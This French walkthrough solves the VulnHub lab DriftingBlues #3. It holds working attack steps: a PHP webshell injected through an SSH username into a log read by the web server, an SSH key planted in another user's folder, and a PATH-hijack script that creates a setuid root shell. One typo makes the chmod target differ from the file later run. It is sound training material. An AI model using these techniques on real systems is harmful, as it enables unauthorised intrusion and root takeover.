# Solution du CTF DriftingBlues #3 de VulnHub

Jamais deux sans trois
----------------------

On continue sur la lignée ce cette série de CTFs avec [le troisième](https://www.vulnhub.com/entry/driftingblues-3,656/) du nom.  

On est toujours à mi chemin entre le réalisme et le jeu de pistes ainsi qu'une difficulté accessible pour ceux qui souhaiterait se jeter à l'eau.  

```plain
Nmap scan report for 192.168.56.8 
Host is up (0.00054s latency). 
Not shown: 65533 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 
| ssh-hostkey:  
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA) 
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA) 
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519) 
80/tcp open  http    Apache httpd 2.4.38 ((Debian)) 
|_http-title: Site doesn't have a title (text/html). 
| http-robots.txt: 1 disallowed entry  
|_/eventadmins 
|_http-server-header: Apache/2.4.38 (Debian)
```

Le serveur web héberge un site d'un festival de musique Blues imaginaire. L'URL mentionnée dans le *robots.txt* nous livre le contenu suivant :  

```plain
man there's a problem with ssh
john said "it's poisonous!!! stay away!!!"
idk if he's mentally challenged
please find and fix it
also check /littlequeenofspades.html
your buddy, buddyG
```

On suit donc cette nouvelle URL et on arrive sur ce qui est sans doute les paroles d'une chanson. En sélectionnant tout le texte ou en regardant le code source de la page on découvre écrit blanc sur blanc le texte suivant :  

```plain
aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==
```

Les caractères égal en fin de chaîne trahissent l'utilisation du base64. Ceci se décode en

```plain
intruder? L2FkbWluc2ZpeGl0LnBocA==
```

que l'on décode une fois de plus en */adminsfixit.php*.  

Le blues des logs
-----------------

Cette URL a un contenu similaire à ceci :  

```plain
#######################################################################
ssh auth log
============
i hope some wacky and uncharacteristic thing would not happen
this job is fucking poisonous and im boutta planck length away from quitting this hoe
-abuzer komurcu
#######################################################################

Jan 20 01:46:44 driftingblues sshd[703]: Did not receive identification string from 192.168.56.1 port 59838
Jan 20 01:46:50 driftingblues sshd[704]: Protocol major versions differ for 192.168.56.1 port 59840: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 vs. SSH-1.5-Nmap-SSH1-Hostkey
Jan 20 01:46:50 driftingblues sshd[705]: Protocol major versions differ for 192.168.56.1 port 59842: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 vs. SSH-1.5-NmapNSE_1.0
Jan 20 01:46:50 driftingblues sshd[706]: Unable to negotiate with 192.168.56.1 port 59844: no matching host key type found. Their offer: ssh-dss [preauth]
Jan 20 01:46:50 driftingblues sshd[708]: Connection closed by 192.168.56.1 port 59848 [preauth]
Jan 20 01:46:50 driftingblues sshd[710]: Connection closed by 192.168.56.1 port 59850 [preauth]
Jan 20 01:46:50 driftingblues sshd[712]: Unable to negotiate with 192.168.56.1 port 59852: no matching host key type found. Their offer: ecdsa-sha2-nistp384 [preauth]
Jan 20 01:46:50 driftingblues sshd[714]: Unable to negotiate with 192.168.56.1 port 59854: no matching host key type found. Their offer: ecdsa-sha2-nistp521 [preauth]
Jan 20 01:46:50 driftingblues sshd[716]: Connection closed by 192.168.56.1 port 59856 [preauth]
Jan 20 01:47:01 driftingblues CRON[718]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 20 01:47:01 driftingblues CRON[718]: pam_unix(cron:session): session closed for user root
```

Ce qui est intéressant c'est que la ligne Nmap est très certainement de notre fait. Deux possibilités alors : soit le script PHP fait un *readfile()* sur le fichier de log soit une tache CRON ajoute le contenu du log à la fin du fichier PHP.  

La seconde option semble plus valide car si j'essaye un login SSH avec un compte invalide il se passe un moment avant que n'apparaisse la ligne suivante :  

```plain
Jan 20 01:55:19 driftingblues sshd[762]: Invalid user zozo from 192.168.56.1 port 59860
```

Il n'y a plus qu'à confirmer cette hypothèse avec l'injection de PHP dans les logs :  

```bash
ssh -l '<?php system($_GET[chr(99)]); ?>' 192.168.56.8
```

Et bada bing bada boom on obtient notre exécution de commande qu'on converti immédiatement en un beau shell PTY à l'aide de [ReverseSSH](https://github.com/Fahrj/reverse-ssh).  

Robery
------

Notre prochaine cible est de toute évidence l'utilisateur *robertj* présent sur le système.  

```plain
www-data@driftingblues:/var/www/html$ ls /home/robertj/ -al  
total 16 
drwxr-xr-x 3 robertj robertj 4096 Jan  4  2021 . 
drwxr-xr-x 3 root    root    4096 Jan  4  2021 .. 
drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .ssh 
-r-x------ 1 robertj robertj 1805 Jan  3  2021 user.txt
```

Oh ! son dossier *.ssh* est accessible en écriture pour tous. J'utilise le tunnel ReverseSSH pour déposer ma clé publique et je peux ensuite accéder au compte sur le serveur SSH en écoute :  

```plain
$ sftp -P 8888 127.0.0.1 
devloop@127.0.0.1's password:  
Connected to 127.0.0.1. 
sftp> cd /home/robertj/.ssh/
sftp> put /home/devloop/.ssh/id_rsa.pub authorized_keys 
Uploading /home/devloop/.ssh/id_rsa.pub to /home/robertj/.ssh/authorized_keys

$ ssh robertj@192.168.56.8 
Enter passphrase for key '/home/devloop/.ssh/id_rsa':  
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 

The programs included with the Debian GNU/Linux system are free software; 
the exact distribution terms for each program are described in the 
individual files in /usr/share/doc/*/copyright. 

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent 
permitted by applicable law. 
robertj@driftingblues:~$ cat user.txt  
flag 1/2 
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ 
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ 
░░░░█░░░░░░░░░░░░░░░░░░░░░░█ 
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ 
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ 
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ 
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ 
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ 
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ 
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ 
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ 
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ 
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ 
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ 
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ 
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ 
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ 
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ 
░░█░░▌░█░░█░░█░░░█░░█░░█ 
░░█░░▀▀░░██░░█░░░█░░█░░█ 
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ 
```

Smooth Operator
---------------

Robert fait partie du clan *operators* : *uid=1000(robertj) gid=1000(robertj) groups=1000(robertj),1001(operators)*  

Voyons voir les fichiers pour ce groupe :  

```plain
robertj@driftingblues:~$ find / -group operators 2> /dev/null  
/usr/bin/getinfo 
robertj@driftingblues:~$ file /usr/bin/getinfo 
/usr/bin/getinfo: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=50c270711d2a2d6c688d5c498e50a3d38b4f7ff5, for
 GNU/Linux 3.2.0, not stripped
```

Ce binaire est setuid root et lisible mais la commande strings n'étant pas présente je m'en remet à hexdump pour voir les potentielles chaines intéressantes dans l'exécutable :  

```plain
robertj@driftingblues:~$ hexdump -C /usr/bin/getinfo
--- snip ---
00002010  23 23 23 23 23 23 23 23  23 23 23 0a 69 70 20 61  |###########.ip a| 
00002020  64 64 72 65 73 73 0a 23  23 23 23 23 23 23 23 23  |ddress.#########| 
00002030  23 23 23 23 23 23 23 23  23 23 0a 00 69 70 20 61  |##########..ip a| 
00002040  00 00 00 00 00 00 00 00  23 23 23 23 23 23 23 23  |........########| 
00002050  23 23 23 23 23 23 23 23  23 23 23 0a 68 6f 73 74  |###########.host| 
00002060  73 0a 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |s.##############| 
00002070  23 23 23 23 23 0a 00 63  61 74 20 2f 65 74 63 2f  |#####..cat /etc/| 
00002080  68 6f 73 74 73 00 00 00  23 23 23 23 23 23 23 23  |hosts...########| 
00002090  23 23 23 23 23 23 23 23  23 23 23 0a 6f 73 20 69  |###########.os i| 
000020a0  6e 66 6f 0a 23 23 23 23  23 23 23 23 23 23 23 23  |nfo.############| 
000020b0  23 23 23 23 23 23 23 0a  00 75 6e 61 6d 65 20 2d  |#######..uname -| 
000020c0  61 00 00 00 01 1b 03 3b  38 00 00 00 06 00 00 00  |a......;8.......|
--- snip ---
```

On est dans un scénario classique d'exploitation du PATH. Comme le binaire va chercher à exécuter la commande *cat* on va placer sur son chemin un exécutable du même nom qui sera exécuté à la place de celui attendu :  

```plain
robertj@driftingblues:~$ cat cat 
#!/bin/bash 
cp /bin/bash /tmp/g0tr00t 
chmod 4755 /tmp/g0troot
robertj@driftingblues:~$ chmod 755 cat 
robertj@driftingblues:~$ export PATH=.:$PATH 
robertj@driftingblues:~$ /usr/bin/getinfo
################### 
ip address 
################### 

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 
    inet 127.0.0.1/8 scope host lo 
       valid_lft forever preferred_lft forever 
    inet6 ::1/128 scope host  
       valid_lft forever preferred_lft forever 
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000 
    link/ether 08:00:27:93:56:19 brd ff:ff:ff:ff:ff:ff 
    inet 192.168.56.8/24 brd 192.168.56.255 scope global dynamic enp0s3 
       valid_lft 407sec preferred_lft 407sec 
    inet6 fe80::a00:27ff:fe93:5619/64 scope link  
       valid_lft forever preferred_lft forever 
################### 
hosts 
################### 

################### 
os info 
################### 

Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux 
robertj@driftingblues:~$ /tmp/g0tr00t -p 
g0tr00t-5.0# cd /root 
g0tr00t-5.0# cat root.txt  
flag 2/2 
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ 
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ 
░░░░█░░░░░░░░░░░░░░░░░░░░░░█ 
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ 
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ 
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ 
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ 
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ 
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ 
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ 
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ 
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ 
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ 
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ 
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ 
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ 
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ 
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ 
░░█░░▌░█░░█░░█░░░█░░█░░█ 
░░█░░▀▀░░██░░█░░░█░░█░░█ 
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ 

congratulations!
```


*Published January 20 2022 at 12:01*